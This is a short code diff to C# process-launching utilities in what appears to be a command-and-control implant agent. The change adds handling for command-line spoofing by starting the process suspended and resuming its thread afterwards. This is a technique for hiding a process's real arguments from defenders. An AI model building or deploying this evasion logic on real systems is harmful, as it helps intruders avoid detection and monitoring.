@@ -43,6 +43,13 @@ namespace Agent.Utlities
                 TrySpoofCommandLine(pInfo, opts);
             }
 
+            // Process will be stopped if we spoof command lines or if we are starting it suspended
+            // If we're JUST process spoofing, we need to start the process
+            if (!opts.suspended && !string.IsNullOrEmpty(opts.spoofedcommandline))
+            {
+                Native.ResumeThread(pInfo.hThread);
+            }
+
             await messageManager.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", opts.task_id, false);
 
             if (!opts.output)
@@ -165,7 +172,6 @@ namespace Agent.Utlities
                 nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
                 bInheritHandle = true,
                 lpSecurityDescriptor = IntPtr.Zero
-
             };
 
             //Add output Redirection
@@ -223,7 +229,7 @@ namespace Agent.Utlities
                 }
 
                 Native.CreateProcessFlags flags;
-                if (opts.suspended)
+                if (opts.suspended || !string.IsNullOrEmpty(opts.spoofedcommandline))
                 {
                     flags = Native.CreateProcessFlags.CREATE_SUSPENDED | Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
                 }
